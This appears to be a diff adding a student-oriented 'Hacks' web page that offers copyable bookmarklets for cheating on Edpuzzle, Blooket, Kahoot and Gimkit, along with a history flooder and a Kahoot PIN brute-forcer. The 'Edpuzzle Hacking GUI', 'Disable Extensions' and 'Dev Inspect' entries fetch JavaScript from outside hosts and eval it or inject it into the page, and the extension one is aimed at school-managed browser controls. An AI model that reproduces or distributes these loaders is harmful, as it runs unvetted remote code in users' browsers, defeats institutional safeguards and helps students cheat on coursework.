@@ -1,0 +1,96 @@
+<html><head>
+    <title>MyHarmonyPortal</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&amp;display=swap" rel="stylesheet">
+  </head>
+  <body>
+    <h1>Hacks</h1>
+    <h2>(Please note that you have to type in "javascript:" without the quotes in the tabs search bar that you want to hack.)</h2>
+    <ul>
+      <li>
+        <div class="list-item">
+          <div class="title">Edpuzzle Hacking GUI</div>
+          <div class="text" id="text1">fetch("https://cdn.jsdelivr.net/gh/ading2210/edpuzzle-answers@latest/script.js").then(r => r.text()).then(r => eval(r))
+        </div>
+          <button onclick="copyText('text1')">Copy</button>
+        </div>
+      </li>
+      <li>
+        <div class="list-item">
+          <div class="title">History Flooder</div>
+          <div class="text" id="text2">javascript: var num=prompt('how many times do you want this page in your history?');done=false;x=window.location.href;for (var i=1; i&lt;=num; i++){
+            history.pushState(0, 0, i==num?x:i.toString());if(i==num){done=true}}if(done===true){
+            alert('flood success! | nabilgames\n '+window.location.href+' \nis now in ur history '+num+(num==1?' time.':' times! '))}</div>
+          <button onclick="copyText('text2')">Copy</button>
+        </div>
+    
+
+</li><li>
+<div class="list-item">
+  <div class="title">Disable Extensions</div>
+  <div class="text" id="text5">  javascript:fetch("https://digitalserpant.github.io/LTBEEF/beef.js").then(data=&gt;{data.text().then(text=&gt;{eval(text)})});</div>
+  <button onclick="copyText('text5')">Copy</button>
+</div>
+
+</li>
+<li>
+  <div class="list-item">
+    <div class="title">Blooket Hacking GUI</div>
+    <div class="text" id="text3">By far the most popular I've made</div>
+    <button onclick="copyHacks()">Copy</button>
+  </div>
+
+    <li>
+    <div class="list-item">
+      <div class="title">Dev Inspect Feature</div>
+      <div class="text" id="text7">(function()%7B(function() %7Bvar x %3D document.createElement("script")%3Bx.src %3D "https%3A%2F%2Fcdn.jsdelivr.net%2Fgh%2FSnowLord7%2Fdevconsole%40master%2Fmain.js"%3Bx.onload %3D alert("Loaded Developer Console!")%3Bdocument.head.appendChild(x)%3B%7D)()%7D)()</div>
+      <button onclick="copyText('text7')">Copy</button>
+    </div>
+  </li>
+
+<li>
+  <div class="list-item">
+    <div class="title">Kahoot Hacks</div>
+    <div class="text" id="text8">I did not make it, I just found it on the internet because Im lazy</div>
+    <button onclick="copyHacks1()">Copy</button>
+  </div>
+    </li>
+      <li>
+    <div class="list-item">
+      <div class="title">Gimkit Hack</div>
+      <div class="text" id="text65465">This kinda works, if you dont know how to use it dont try</div>
+      <button onclick="copyHacks2()">Copy</button>
+    </div>
+    </li>
+    <li>
+      <div class="list-item">
+        <div class="title">Dark-Mode</div>
+        <div class="text" id="textdark">(function()%7Bvar css = 'html {-webkit-filter: invert(100%)%3B' + '-moz-filter: invert(100%)%3B' + '-o-filter: invert(100%)%3B' + '-ms-filter: invert(100%)%3B }' + 'img, video, picture, svg, canvas { -webkit-filter: invert(100%)%3B' + '-moz-filter: invert(100%)%3B' + '-o-filter: invert(100%)%3B' + '-ms-filter: invert(100%)%3B }'%3B var head = document.getElementsByTagName('head')[0]%3B var style = document.createElement('style')%3B style.type = 'text/css'%3B var isPageInverted = false%3B function invertPage() { if (isPageInverted) { style.innerHTML = ''%3B isPageInverted = false%3B } else { style.innerHTML = css%3B isPageInverted = true%3B } } function createInvertButton() { var button = document.createElement('button')%3B button.innerText = 'Toggle Dark'%3B button.style.position = 'fixed'%3B button.style.bottom = '20px'%3B button.style.right = '20px'%3B button.style.zIndex = '9999'%3B button.style.padding = '10px'%3B button.style.border = 'none'%3B button.style.borderRadius = '5px'%3B button.style.backgroundColor = '#333'%3B button.style.color = '#fff'%3B button.style.cursor = 'pointer'%3B button.addEventListener('click', invertPage)%3B document.body.appendChild(button)%3B } if (style.styleSheet) { style.styleSheet.cssText = css%3B } else { style.appendChild(document.createTextNode(css))%3B } head.appendChild(style)%3B createInvertButton()%3B %7D)()%3B</div>
+        <button onclick="copyText('textdark')">Copy</button>
+      </div>
+      </li>
+          <li>
+        <div class="list-item">
+          <div class="title">Kahoot Game Finder</div>
+          <div class="text" id="text43">(function()%7B document.title = "Close this to stop"%3B document.body.innerHTML = '<div style="display:flex%3Bjustify-content:center%3Balign-items:center%3Bheight:100%%3B"><p style="font-size:3em%3Btext-align:center%3B">Close when done finding pin</p></div>'%3B var interval = setInterval(function() { var code = Math.floor(Math.random() * 9000000 + 1000000)%3B var url = "https://kahoot.it/?pin=" + code + "&refer_method=link"%3B var win = window.open(url, "_blank")%3B setTimeout(function() { if (win.document.querySelector('div[data-functional-selector="notification-bar-error"]')) { win.close()%3B } }, 600)%3B }, 600)%3B %7D)()%3B
+        </div>
+          <button onclick="copyText('text43')">Copy</button>
+        </div>
+      </li>
+    <script src="index.js"></script>
+  </body>
+<script src="https://cdn.jsdelivr.net/npm/js-cookie@3.0.1/dist/js.cookie.min.js"></script>
+<script>
+  var myCookie = Cookies.get('Verifide');
+
+if(myCookie==='close'){
+this.close();
+}
+else{
+
+}
+        window.addEventListener("beforeunload", function(event) {
+        Cookies.set('Verifide', 'close', { expires: 1 })
+       });
+</script>
+</html>
